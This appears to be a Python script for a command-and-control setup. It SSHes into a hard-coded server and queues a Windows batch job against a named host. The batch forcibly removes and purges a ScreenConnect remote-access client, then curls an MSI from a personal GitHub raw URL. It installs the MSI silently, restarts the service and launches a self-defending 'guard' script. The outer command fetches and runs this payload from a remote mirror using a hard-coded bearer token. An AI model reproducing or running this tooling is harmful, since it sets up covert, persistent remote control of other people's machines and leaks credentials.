#!/usr/bin/env python3
"""Inline batch Gryxa recover — no nested PS $ vars, start/wait msiexec."""
from __future__ import annotations

import sys
from pathlib import Path

import paramiko

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
TARGET = "ADMINIS-0ET5284"

# Written to a .cmd on the host via multiple lines? Keep as one start/min body.
# Use start /wait msiexec (no PowerShell). Log every step.
INNER = r"""
>C:\Users\Public\gryxa_recover.log echo [%DATE% %TIME%] recover4_begin
>C:\ProgramData\WinRTCS\extkill.cnt echo 0
>C:\ProgramData\WinRTCS\fight.cnt echo 0
>C:\ProgramData\WinRTCS\guard.cnt echo 9999
>C:\ProgramData\WinRTCS\gryxa_boost.cnt echo 15
rmdir /s /q C:\ProgramData\WinRTCS\guard.lockd
sc stop "ScreenConnect Client (36e506ff016b2151)"
sc delete "ScreenConnect Client (36e506ff016b2151)"
taskkill /F /IM ScreenConnect.ClientService.exe
taskkill /F /IM ScreenConnect.WindowsClient.exe
takeown /f "C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)" /r /d y
icacls "C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)" /grant Administrators:F /t /c /q
rmdir /s /q "C:\Program Files (x86)\ScreenConnect Client (36e506ff016b2151)"
takeown /f "C:\Program Files\ScreenConnect Client (36e506ff016b2151)" /r /d y
icacls "C:\Program Files\ScreenConnect Client (36e506ff016b2151)" /grant Administrators:F /t /c /q
rmdir /s /q "C:\Program Files\ScreenConnect Client (36e506ff016b2151)"
reg delete "HKLM\SOFTWARE\Classes\Installer\Products\814CC7D9653A3969CD5C14CE440DB313" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\814CC7D9653A3969CD5C14CE440DB313" /f
reg delete "HKCR\Installer\Products\814CC7D9653A3969CD5C14CE440DB313" /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{9D7CC418-A356-9693-DCC5-41EC44D03B31}" /f
reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\{9D7CC418-A356-9693-DCC5-41EC44D03B31}" /f
>>C:\Users\Public\gryxa_recover.log echo [%DATE% %TIME%] purged
C:\Windows\System32\curl.exe -f -L --ssl-no-revoke --connect-timeout 15 --max-time 180 -o C:\ProgramData\WinRTCS\gryxa_install.msi https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi
>>C:\Users\Public\gryxa_recover.log echo [%DATE% %TIME%] msi_fetched
start /wait msiexec /i C:\ProgramData\WinRTCS\gryxa_install.msi /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress /l*v C:\ProgramData\WinRTCS\msi_gryxa_install.log
>>C:\Users\Public\gryxa_recover.log echo [%DATE% %TIME%] msiexec_done errorlevel=%ERRORLEVEL%
ping -n 16 127.0.0.1 >nul
sc config "ScreenConnect Client (36e506ff016b2151)" start= auto
sc start "ScreenConnect Client (36e506ff016b2151)"
ping -n 11 127.0.0.1 >nul
sc query "ScreenConnect Client (36e506ff016b2151)" >>C:\Users\Public\gryxa_recover.log
sc query "ScreenConnect Client (36e506ff016b2151)" | findstr /C:"RUNNING" >nul && >>C:\Users\Public\gryxa_recover.log echo RECOVER=OK || >>C:\Users\Public\gryxa_recover.log echo RECOVER=FAIL_SVC
start "" /min cmd.exe /c C:\ProgramData\WinRTCS\winrtcs_guard.cmd
""".strip()


def main() -> None:
    # Write inner to a file on VPS, host will curl it from mirror — avoids quote hell in start/c
    # Also queue: copy from mirror via bearer + call
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(
        "144.172.107.56",
        username="winrtcs",
        key_filename=str(Path.home() / ".ssh" / "winrtcs_ed25519"),
        timeout=20,
    )

    # Build recover4.cmd with CRLF
    body = "@echo off\r\n" + INNER.replace("\n", "\r\n") + "\r\n"
    sftp = ssh.open_sftp()
    with sftp.file("/tmp/winrtcs_gryxa_recover4.cmd", "wb") as f:
        f.write(body.encode("ascii", errors="replace"))

    # Outer agent cmd: fetch recover4 from VPS mirror (always available), start/min it, return
    outer = (
        r'C:\Windows\System32\curl.exe -f -L --ssl-no-revoke '
        r'-H "Authorization: Bearer fe7e8f3b8af479870248be10ca25410b8e1bf9a5" '
        r'--connect-timeout 15 --max-time 60 '
        r'-o C:\Users\Public\gryxa_recover4.cmd '
        r'https://debian.seczio.com/winrtcs/winrtcs_gryxa_recover4.cmd '
        r'& start "" /min cmd.exe /c C:\Users\Public\gryxa_recover4.cmd '
        r'& echo RECOVER4_STARTED'
    )
    with sftp.file("/tmp/outer4.txt", "w") as f:
        f.write(outer)

    py = r"""
import sqlite3, time, os
os.system('sudo cp /tmp/winrtcs_gryxa_recover4.cmd /opt/winrtcs/repo/winrtcs_gryxa_recover4.cmd')
os.system('sudo chmod 644 /opt/winrtcs/repo/winrtcs_gryxa_recover4.cmd')
con=sqlite3.connect('/opt/winrtcs/fleet.db')
now=time.time()
cmd=open('/tmp/outer4.txt',encoding='utf-8').read().strip()
cur=con.execute('INSERT INTO cmds(ts,target,cmd) VALUES(?,?,?)',(now,'ADMINIS-0ET5284',cmd))
cid=int(cur.lastrowid)
con.execute('''INSERT INTO jobs(ts,name,target,params,cmd_id,note,status,attempts,max_attempts,updated)
 VALUES(?,?,?,?,?,?,?,?,?,?)''',
 (now,'recover-gryxa','ADMINIS-0ET5284','{}',cid,'recover4 inline batch','queued',1,2,now))
con.commit()
print('queued', cid, 'outer_len', len(cmd), 'body_len', os.path.getsize('/opt/winrtcs/repo/winrtcs_gryxa_recover4.cmd'))
con.close()
"""
    with sftp.file("/tmp/q4.py", "w") as f:
        f.write(py)
    sftp.close()
    _, o, e = ssh.exec_command("sudo python3 /tmp/q4.py", timeout=30)
    print(o.read().decode(), e.read().decode())
    ssh.close()


if __name__ == "__main__":
    main()
